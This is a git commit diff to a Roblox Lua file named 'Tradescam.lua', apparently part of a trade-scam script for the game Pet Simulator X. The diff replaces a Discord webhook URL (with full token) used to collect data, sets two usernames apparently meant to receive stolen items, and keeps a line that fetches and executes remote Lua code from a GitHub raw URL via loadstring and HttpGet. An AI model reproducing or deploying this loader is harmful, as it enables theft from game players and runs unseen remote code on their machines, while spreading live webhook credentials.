31656a08e807567436b35080842ff6a18b152468
Petsimulatorx <128840437+Petsimulatotx@users.noreply.github.com>
2023-03-26 13:16:34 +0800

    Update Tradescam.lua

--- Tradescam.lua
+++ Tradescam.lua
@@ -2,6 +2,6 @@ UserName = "zenn2344"
 
 UserName2 = "zenn2345"
 
-Webhook = "https://discord.com/api/webhooks/1088913040717651988/XBgxmshATCbU3wCt4SbbiniovbSANnCFjG5_1h7HtPd9aXjhXVz5GIyebMqMaPkABoIG"
+Webhook = "https://discord.com/api/webhooks/1089416078133837944/KC1q49e1WzsfRBxH1ph4OLtNfTXQXgNfYvxySzyTl8CwiHawlRwbfcVlfGBGj8NcaBgS"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
